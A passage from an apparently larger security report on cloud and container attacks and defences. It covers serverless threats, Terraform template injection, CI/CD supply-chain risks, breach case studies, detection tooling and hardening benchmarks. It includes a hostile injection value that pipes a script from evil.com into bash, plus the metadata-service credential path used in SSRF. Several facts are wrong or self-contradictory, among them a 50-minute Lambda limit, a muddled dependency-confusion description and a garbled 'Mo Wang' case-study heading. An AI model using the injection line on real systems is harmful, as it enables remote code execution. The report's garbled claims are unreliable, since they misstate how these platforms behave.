Serverless architectures (AWS Lambda, Azure Functions, Google Cloud Functions, Google Cloud Run) remove the need to manage servers but introduce new attack surfaces:

1. **Event Injection:** Serverless functions are triggered by events (HTTP requests, S3 events, SQS messages, SNS notifications). Each event payload is a potential injection vector. A Lambda function that processes SQS messages without sanitizing them is as vulnerable as a web application that doesn't sanitize user input.

2. **IAM Over-provisioning:** Lambda functions execute with an IAM role that determines their permissions. In practice, these roles are often over-provisioned because developers add permissions incrementally and never remove unused ones. A function that only needs to write to one S3 bucket is often given `s3:*` on `*`.

3. **Cold Start Side Channels:** The first invocation of a Lambda function (a "cold start") initializes the runtime environment. This initialization takes longer than subsequent invocations ("warm starts"). An attacker who can time function invocations can infer information about function behavior, what libraries are loaded, and potentially trigger denial of service by forcing cold starts.

4. **Shared Responsibility Shift:** In serverless, the customer is responsible for application code, IAM permissions, and data classification. The provider manages the runtime, infrastructure, and scaling. But the customer often cannot inspect the runtime for compromise, install agents, or configure network rules at the instance level.

5. **Logging Gaps:** Lambda functions have a 50-minute maximum execution time, but logging is not enabled by default for all event sources. SQS-triggered functions, for example, do not log the message payload by default. This creates blind spots in detection.

### 9.2 Lambda-Specific Attacks

**SSRF in Lambda:** Lambda functions running in a VPC can reach the EC2 metadata service. If a Lambda function processes HTTP requests (via API Gateway) and has an SSRF vulnerability, the attacker can retrieve the Lambda's IAM credentials from the metadata service. These credentials are temporary (lasting up to 12 hours by default, configurable to 1 hour) but sufficient for data exfiltration.

**Environment Variable Exfiltration:** Lambda environment variables are accessible within the function via `process.env` (Node.js) or `os.environ` (Python). If the function has a vulnerability that allows reading environment variables (SSRF via `file:///proc/self/environ`, or code injection), the attacker can extract database credentials, API keys, and other secrets stored as environment variables.

**Dependency Confusion in Lambda Layers:** Lambda layers are shared code libraries that can be attached to multiple functions. If a function imports a layer by name without specifying a version, an attacker who can publish a layer with the same name (if they have `lambda:UpdateFunctionCode` or `lambda:PublishLayerVersion` permissions) can inject malicious code.

### 9.3 Azure Functions and GCP Cloud Functions

Azure Functions and GCP Cloud Functions have similar threat models to Lambda, with platform-specific differences:

- **Azure Functions** use Managed Identities (system-assigned or user-assigned) instead of IAM roles. The same over-provisioning problem exists: a function App with `Storage Blob Data Contributor` at the storage account scope level when it only needs read access to one container.

- **GCP Cloud Functions** use service accounts. The `cloudfunctions.functions.create` permission, if available to an attacker, allows deploying a function with any service account they can `actAs`. This is equivalent to the AWS `lambda:CreateFunction` + `iam:PassRole` escalation path.

---

## Chapter 10: IaC & Supply Chain

> **Detailed research:** [`docs/05b_iac_supply_chain.md`](docs/05b_iac_supply_chain.md)

### 10.1 Terraform as an Attack Surface

Terraform configurations define cloud infrastructure declaratively. They are also code, and subject to code-level attacks:

**Template Injection:** Terraform's `templatefile()` function and heredoc templates allow string interpolation. If a Terraform configuration uses user-controlled input in a template that generates cloud-init scripts, IAM policies, or security group rules, the attacker can inject arbitrary content:

```hcl
# Vulnerable: user_input interpolated directly into cloud-init
data "template_file" "user_data" {
  template = file("${path.module}/cloud-init.sh")
  vars = {
    user_input = var.user_input  # Attacker-controlled
  }
}
```

If `var.user_input` contains `"; curl http://evil.com/shell.sh | bash; "` then the resulting cloud-init script executes the attacker's code on the target VM.

**State File Exposure:** Terraform state files (`terraform.tfstate`) contain all resource attributes in plaintext — including secret values, database passwords, and private keys. If state files are stored in an S3 bucket without proper access controls, they become a treasure trove for attackers. Even when stored in a secured backend (S3 with encryption, Terraform Cloud, etc.), the state file exists in memory during `terraform apply` and can be leaked if the CI/CD runner is compromised.

**Provider Credential Leakage:** Terraform providers require credentials to interact with cloud APIs. The `aws`, `azurerm`, and `google` providers all accept credentials via environment variables, shared credentials files, or inline configuration. Inline credentials in Terraform configurations are a frequent misconfiguration:

```hcl
# NEVER DO THIS:
provider "aws" {
  access_key = "AKIAIOSFODNN7EXAMPLE"  # Committed to git
  secret_key = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
}
```

### 10.2 CI/CD Pipeline Attacks

The SolarWinds SUNBURST attack (discussed in more detail in the [Supply Chain track](../supply_chain_security/)) demonstrated that compromising the build pipeline is more effective than compromising the product itself. For cloud-native deployments, the CI/CD pipeline is the de facto control plane:

1. **Pipeline Poisoning:** If an attacker can modify the CI/CD pipeline (via compromised git credentials, push to an unprotected branch, or dependency confusion), they can inject malicious code into every deployment.

2. **Dependency Confusion:** When a build system resolves dependencies, it will prefer a local/private registry over a public one if the package name exists in both. If an attacker registers a package name that exists only in the private registry (e.g., `company-internal-utils`) on PyPI, npm, or NuGet, the build system may pull the attacker's package instead.

3. **Container Image Supply Chain:** Base images (e.g., `python:3.11-slim`, `alpine:3.18`) are supply chain dependencies. If the base image is compromised, every downstream image is compromised. The `python:3.11-slim` image has ~50 packages, each of which is a potential vulnerability. Image signing (cosign, Docker Content Trust) and SBOM (Software Bill of Materials) generation are necessary but insufficient controls.

---

# PART VI: EXPLOITATION, DETECTION & HARDENING

---

## Chapter 11: Cloud Exploitation Case Studies

> **Detailed research:** [`docs/06a_cloud_exploitation_case_studies.md`](docs/06a_cloud_exploitation_case_studies.md)

### 11.1 Capital One (2019)

The Capital One breach remains the most studied cloud security incident. The attacker exploited a Server-Side Request Forgery (SSRF) vulnerability in a misconfigured WAF (ModSecurity on Apache) to access the EC2 instance metadata service, retrieve IAM role credentials, and use those credentials to access S3 buckets containing 106 million customer records.

**Attack Chain:**
1. SSRF in WAF → `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
2. Retrieved `AccessKeyId`, `SecretAccessKey`, and `SessionToken`
3. Used credentials to list and read S3 buckets
4. Exfiltrated 106 million records (names, SSNs, bank account numbers)

**Root Causes:**
- WAF misconfigured to allow outbound connections to the metadata service
- EC2 instance role with excessive S3 permissions (`s3:*` on `*` instead of specific buckets)
- No IMDSv2 enforcement (IMDSv1 allows simple GET requests)

**Cross-Reference:** This attack chain is the canonical example of metadata SSRF → credential theft, discussed throughout the [Zero-Day track](../zero_day/docs/01b_zero_day_ecosystem_attack_surfaces.md) as a cloud initial access vector.

### 11.2 TeamTNT Cryptojacking (2020-2022)

TeamTNT was a cloud-focused threat group that targeted misconfigured Docker daemons and Kubernetes clusters for cryptocurrency mining. Their attack chain:

1. Scanned for exposed Docker daemons (port 2375/2376) and Kubernetes API servers
2. Injected containers running cryptomining software
3. Used the compromised containers to scan for more targets (worm behavior)
4. Harvested cloud credentials from metadata services and container environment variables
5. Used harvested credentials to provision new cloud instances for mining

**Key Indicators:** `/.dockerenv` file presence, `curl http://169.254.169.254` in process command lines, unusual outbound connections on port 3333 (XMRig default), ` apt-get install` in container process trees.

### 11.3 SolarWinds SUNBURST Cloud Pivot (2020)

While the initial compromise was a software supply chain attack (covered in depth in the [Supply Chain track](../supply_chain_security/)), the cloud pivot is relevant to this track:

1. SUNBURST backdoor inserted into SolarWinds Orion build process
2. Backdoor beacons to C2 infrastructure
3. After lateral movement, attackers targeted on-premises-to-cloud SAML federation
4. Forged SAML tokens (Golden SAML attack) to access cloud services (O365, Azure AD)
5. Used forged tokens to access email, exfiltrate data, and persist across cloud environments

The Golden SAML technique requires the ADFS signing key, which the attackers extracted after compromising on-premises ADFS servers. This demonstrates the cloud-to-on-premises trust boundary: compromising on-premises identity infrastructure can provide unrestricted cloud access.

### 11.4魔王 (Mo Wang) / Exploit.In Cloud Credential Dumps

Cloud credentials are routinely exposed on dark web forums and paste sites. The Exploit.In forum and other underground markets host large collections of cloud credentials obtained through:
- GitHub(commit history) scanning for accidentally committed credentials
- S3 bucket enumeration for publicly accessible configuration files
- Phishing campaigns targeting cloud administrators
- Supply chain compromises that leak CI/CD pipeline credentials

### 11.5 Cross-References to Other Tracks

Each of these case studies connects to other tracks in this repository:
- **Container escape via kernel exploits** → [Linux Kernel track](../linux_kernel/docs/08b_modern_cves.md)
- **Exploitation methodology** → [Zero-Day track](../zero_day/docs/04a_kernel_slab_exploitation.md)
- **Hypervisor escape** → [CPU Rings track](../ring_and_vulns/) (Ring -1 attacks on cloud hypervisors)
- **Supply chain compromise** → [Supply Chain track](../supply_chain_security/)
- **Windows container exploitation** → [OSEE track](../OSEE/) (Windows kernel exploitation parallels)

---

## Chapter 12: Detection & Monitoring

> **Detailed research:** [`docs/06b_cloud_detection_monitoring.md`](docs/06b_cloud_detection_monitoring.md)

### 12.1 Cloud-Native Logging

Effective cloud security detection requires correlating events across multiple log sources:

| Log Source | AWS | Azure | GCP |
|-----------|-----|-------|-----|
| API Audit | CloudTrail | Activity Log | Audit Log |
| Network Flow | VPC Flow Logs | NSG Flow Logs | VPC Flow Logs |
| Data Access | S3 Access Logs | Storage Analytics | Data Access Logs |
| Host-Level | CloudWatch Agent | Azure Monitor Agent | Ops Agent |
| Container | Container Insights | Container Insights | Cloud Operations |
| K8s Audit | EKS Audit Logs | AKS Audit Logs | GKE Audit Logs |
| Serverless | Lambda CloudWatch | App Insights | Cloud Functions Logs |

**AWS CloudTrail** is the primary audit log for AWS API calls. It records the identity, source IP, time, and parameters of every API call. Key detection opportunities:

- `iam:CreateAccessKey` for any user besides the requesting user
- `iam:AttachUserPolicy` or `iam:PutUserPolicy` with `AdministratorAccess`
- `sts:AssumeRole` with an unusual source IP or from an unusual role
- `ec2:RunInstances` with an unusual AMI or in an unusual region
- `s3:GetObject` on sensitive buckets from unusual IPs

**GCP Audit Logs** are enabled by default for all Google Cloud services and cannot be disabled (for Data Access, they are opt-in). This is a significant advantage over AWS, where CloudTrail must be explicitly configured and Data Events are not enabled by default.

### 12.2 Falco: Runtime Container Security

Falco is an open-source runtime security tool that uses eBPF or a kernel module to detect anomalous behavior in containers. It operates at the syscall level and detects:

- Privileged container creation
- Container escape attempts (e.g., `nsenter`, `/proc/self/exe` access from within containers)
- Unexpected network connections from containers
- Sensitive file access (`/etc/shadow`, `/etc/kubernetes/admin.conf`)
- Shell spawning inside containers
- Cloud metadata access from containers
- Container drift (new processes or files not in the original image)

The Falco rule language is expressive and allows for fine-grained detection. The [CHEATSHEET.md](CHEATSHEET.md) includes example Falco rules for detecting privileged container creation, container escape via `/proc/self/exe`, cgroup release_agent abuse, metadata SSRF, and RBAC privilege escalation.

### 12.3 eBPF-Based Detection

eBPF (Extended Berkeley Packet Filter) is the next generation of runtime detection, offering low-overhead kernel-level observability without kernel modules:

- **Tetragon** (by Isovalent/Cilium) uses eBPF to trace process execution, file access, and network connections at the kernel level with virtually zero overhead.
- **Pixie** (by New Relic) uses eBPF for auto-telemetric Kubernetes observability.
- **Tracee** (by Aqua Security) uses eBPF to trace system calls and detect container runtime attacks.

eBPF detection can observe events that traditional monitoring cannot: the exact syscalls a container makes, the files it accesses on the host filesystem, the network connections it establishes, and the kernel capabilities it exercises. This connects to the [Linux Kernel track](../linux_kernel/docs/09b_static_analysis.md), which discusses eBPF as both a security mechanism and an attack surface.

---

## Chapter 13: Hardening & Zero-Trust

> **Detailed research:** [`docs/07a_cloud_hardening_zero_trust.md`](docs/07a_cloud_hardening_zero_trust.md)

### 13.1 CIS Benchmarks

The Center for Internet Security (CIS) publishes benchmarks for each cloud platform. Key recommendations:

**AWS CIS Benchmark (v2.0):**
1. Ensure MFA is enabled for all IAM users with console passwords
2. Ensure hardware MFA is enabled for the root user
3. Ensure IAM policies are attached only to groups or roles (not users)
4. Ensure no root user access keys exist
5. Ensure CloudTrail is enabled in all regions
6. Ensure S3 buckets are not publicly accessible
7. Ensure security groups restrict ingress to known IPs on all ports
8. Ensure VPC Flow Logs are enabled for all VPCs
9. Ensure encryption at rest is enabled for RDS, EBS, S3, EFS
10. Ensure IMDSv2 is required on all EC2 instances

**Kubernetes CIS Benchmark (v1.8):**
1. Ensure the API server is not accessible via insecure port (8080)
2. Ensure etcd is not accessible from the network
3. Ensure kubelet anonymous auth is disabled
4. Ensure RBAC is enabled
5. Ensure Pod Security Standards are enforced (at minimum `baseline`)
6. Ensure network policies are applied to all namespaces
7. Ensure Secrets are encrypted at rest in etcd
8. Ensure audit logging is enabled

### 13.2 Zero-Trust Networking for Kubernetes

Zero-trust networking in Kubernetes requires:

1. **Network Policies** restricting all pod-to-pod communication to only what is required (default deny)
2. **Service Mesh (Istio, Linkerd)** providing mTLS between all services
3. **Egress Controls** preventing pods from reaching the metadata service (169.254.169.254) or the internet
4. **Network Service Mesh** for service-to-service authentication at Layer 3-4

A minimal network policy to block metadata access:

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-metadata
  namespace: default
spec:
  podSelector: {}
  policyTypes:
    - Egress
  egress:
    - to:
        - ipBlock:
            cidr: 0.0.0.0/0
            except:
              - 169.254.169.254/32
              - fd00:ec2::254/128
```

### 13.3 Secrets Management

The principle for secrets management in Kubernetes:

1. **Never store secrets in environment variables** — they are visible in `kubectl describe pod` output, in container runtime logs, and in process listings.
2. **Use External Secrets Operators** — AWS Secrets Manager, Azure Key Vault, GCP Secret Manager, or HashiCorp Vault, integrated via the Secrets Store CSI Driver.
3. **Enable etcd encryption at rest** — `--encryption-provider-config` on the API server, using a KMS provider.
4. **Rotate secrets** — Use automated rotation (AWS Secrets Manager rotation, Azure Key Vault auto-rotation).
5. **Use IRSA (AWS), Workload Identity (GCP), or Managed Identity (Azure)** — Instead of storing cloud credentials as Kubernetes secrets, use workload identity mechanisms that inject short-lived credentials via the metadata service or projected service account tokens.

---

## Chapter 14: Compliance Automation

> **Detailed research:** [`docs/07b_compliance_automation.md`](docs/07b_compliance_automation.md)

### 14.1 Policy as Code

Infrastructure as Code without Policy as Code is just automated misconfiguration. The following tools enforce compliance:

| Tool | Platform | Policy Language | Use Case |
|------|----------|----------------|----------|
| **OPA/Gatekeeper** | Kubernetes | Rego | Pod security, RBAC, network policies |
| **AWS Config** | AWS | Managed rules + custom | Compliance status tracking |
| **Azure Policy** | Azure | JSON conditions | Resource compliance at scale |
| **GCP Organization Policy** | GCP | Constraint templates | Restrict SA keys, enforce OS Login |
| **tfsec** | Terraform | Built-in checks | CIS benchmark, security best practices |
| **Checkov** | Multi-platform | Python-based | Terraform, CloudFormation, Kubernetes, Helm |
| **Terrascan** | Multi-platform | OPA/Rego | IaC scanning |
| **Falco** | Runtime | YAML + condition syntax | Container and K8s runtime detection |

### 14.2 Continuous Compliance Pipeline

A compliance pipeline should:

1. **Scan IaC before deployment** — tfsec, Checkov, or Terrascan in CI/CD
2. **Validate admission** — OPA Gatekeeper or Kyverno in Kubernetes
3. **Detect runtime violations** — Falco, Tetragon, or Tracee
4. **Audit continuously** — AWS Config rules, Azure Policy, periodic Drift Detection
5. **Remediate automatically** — AWS Config remediation, Azure Policy remediation, Kyverno generate rules

```
┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│   IaC Scan   │───►│   Admission  │───►│   Runtime    │───►│   Continuous │
│  (tfsec,     │    │  (Gatekeeper, │    │  Detection   │    │   Audit      │
│   Checkov)   │    │   Kyverno)   │    │   (Falco,    │    │  (Config,    │
│              │    │              │    │    Tetragon)  │    │   Policy)    │
└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
     Pre-deploy        Deploy-time           Runtime            Continuous
```

This pipeline ensures that misconfigurations are caught at every stage: before deployment (IaC scanning), during deployment (admission control), at runtime (behavior detection), and continuously (compliance auditing).

---

## Conclusion

Cloud and container security is not a single domain but an intersection of identity management, infrastructure configuration, kernel security, orchestration complexity, supply chain integrity, and runtime detection. The attack paths are long and deep — from an SSRF in a web application to the EC2 metadata service to IAM credential theft to S3 data exfiltration, from a misconfigured Kubernetes RBAC binding to cluster-admin access to etcd compromise to full cluster takeover, from a dependency confusion in a CI/CD pipeline to malicious code injection in every deployment.

The defensive posture must be equally layered: IMDSv2 enforcement and metadata service blocking to prevent credential theft, least-privilege IAM policies and permission boundaries to limit blast radius, Pod Security Standards and network policies to contain container breaches, Falco and eBPF monitoring for runtime detection, and continuous compliance auditing to catch misconfigurations before they become incidents.

The cross-references throughout this report connect cloud security to the deeper technical foundations in other tracks: the kernel exploitation techniques that enable container escapes ([Linux Kernel](../linux_kernel/)), the exploitation methodology that structures attack development ([Zero-Day](../zero_day/)), the hypervisor attacks that threaten VM isolation ([CPU Rings](../ring_and_vulns/)), the supply chain attacks that compromise CI/CD pipelines ([Supply Chain](../supply_chain_security/)), and the Windows exploitation parallels for understanding multi-platform container security ([OSEE](../OSEE/)).

Cloud security is, at its core, about reducing the gap between what the platform enables and what the workload requires. Every over-provisioned IAM permission, every privileged container, every open security group, every unhashed secret in etcd, and every unscanned container image widens that gap. The research in this track is designed to help you understand exactly how that gap is exploited — and how to close it.

---

## References

1. Rhino Security Labs. "AWS IAM Privilege Escalation Methods." *Rhino Security Labs*. 2019. https://rhinosecuritylabs.com/aws-privilege-escalation-methods-mitigation/
2. MITRE. "ATT&CK Cloud Matrix." *MITRE Corporation*. 2024. https://attack.mitre.org/matrices/enterprise/cloud/
3. U.S. Department of Justice. "Capital One Data Breach: Paige Thompson Indictment." *Department of Justice*. 2019. https://www.justice.gov/opa/pr/former-seattle-tech-worker-sentitled-serve-five-years-prison-committing-capital-one-hack
4. Aqua Security. "The Kubernetes Attack Tree." *Aqua Security*. 2021. https://www.aquasec.com/resources/kubernetes-attack-tree/
5. Trail of Bits. "Understanding and Hardening Linux Containers." *Trail of Bits*. 2020. https://github.com/trailofbits/understanding-linux-container-security/
6. CIS. "CIS Benchmarks: AWS, Azure, GCP, Kubernetes." *Center for Internet Security*. 2024. https://www.cisecurity.org/cis-benchmarks/
7. Falco. "Falco Documentation." *The Falco Project*. 2024. https://falco.org/docs/
8. NIST. "SP 800-190: Application Container Security Guide." *National Institute of Standards and Technology*. 2024. https://csrc.nist.gov/pubs/sp/800-190/final
9. NSA/CISA. "Kubernetes Hardening Guide." *National Security Agency*. 2022. https://media.defense.gov/2022/Aug/29/2003066362/-1/-1/1/CTR_KUBERNETES_HARDENING_GUIDANCE.PDF
10. OWASP. "Serverless Security Project." *Open Worldwide Application Security Project*. 2024. https://owasp.org/www-project-serverless-security/
11. CVE-2019-5736. NVD. https://nvd.nist.gov/vuln/detail/CVE-2019-5736
12. CVE-2020-15257. NVD. https://nvd.nist.gov/vuln/detail/CVE-2020-15257
13. CVE-2022-0185. NVD. https://nvd.nist.gov/vuln/detail/CVE-2022-0185
14. CVE-2024-1086. NVD. https://nvd.nist.gov/vuln/detail/CVE-2024-1086
15. CVE-2024-21626. NVD. https://nvd.nist.gov/vuln/detail/CVE-2024-21626
16. SolarWinds. "SUNBURST Advisory." *SolarWinds*. 2020. https://www.solarwinds.com/securityadvisory
17. NIST. "SP 800-204: Security Strategies for Microservices-based Application Systems." *National Institute of Standards and Technology*. 2021. https://csrc.nist.gov/pubs/sp/800-204/final
18. AWS. "Shared Responsibility Model." *Amazon Web Services*. 2024. https://aws.amazon.com/compliance/shared-responsibility-model/
19. ISO/IEC. "ISO/IEC 27001:2022 Information Security Management." *International Organization for Standardization*. 2022. https://www.iso.org/standard/27001